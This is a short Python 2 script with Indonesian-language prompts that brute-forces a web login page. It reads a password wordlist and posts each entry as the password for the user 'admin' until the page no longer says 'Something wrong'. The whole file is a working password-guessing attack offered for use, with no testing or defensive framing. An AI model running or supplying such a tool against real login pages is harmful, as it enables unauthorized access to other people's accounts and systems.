#!/usr/bin/env python
import ambiltag
import requests
import string
import time
# import urllib
# import re
# from bs4 import BeautifulSoup



input1 = raw_input("Masukkan URL halaman login : ")

list_variabel_input = ambiltag.fetchListInput(input1)




file = open(raw_input("Masukkan path ke word list yang digunakan : "), 'rt')

for x in file.readlines():
	x = x.strip()
	print "Trying " + x
	data1 = {
		"username" : "admin",
		"password" : "%s" %x,
		"submit" : "LOGIN"
	}
	print data1
	response = requests.post(input1, data1)
	if "Something wrong" not in response.text:
		print x + " Success!"
		break
	
	print response
		